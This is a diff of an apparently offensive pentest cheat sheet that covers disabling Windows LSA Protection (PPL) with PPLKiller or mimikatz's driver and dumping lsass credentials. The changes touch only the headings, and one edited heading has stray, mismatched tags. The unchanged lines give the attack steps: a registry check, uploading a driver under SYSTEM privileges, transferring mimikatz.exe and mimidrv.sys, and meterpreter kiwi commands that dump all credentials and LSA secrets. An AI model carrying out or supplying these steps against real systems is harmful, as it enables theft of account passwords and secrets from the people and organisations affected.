@@ -1,7 +1,7 @@
 ### Check if PPL is enabled
 CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL` - `0x1` means enabled.
 
-### Disable PPL using PPLKiller
+### <ins></ins>Disable PPL using PPLKiller></ins>
 
 Make sure the session you are running with has SYSTEM privleges.
 We need to upload the driver to the path:
@@ -13,7 +13,7 @@ Then we will disable PPL:
 Now we can use meterpreter mimikatz module to dump the lsass process: 
 - `load kiwi` - `creds_all` - `lsa_dump_secrets`
 
-### Disable PPL using mimikatz
+### <ins>Disable PPL using mimikatz</ins>
 Transfer both `mimikatz.exe` and `mimidrv.sys` to the same directory, e.g `C:\Windows\Tasks`.
 
 Dump logonpasswords: 
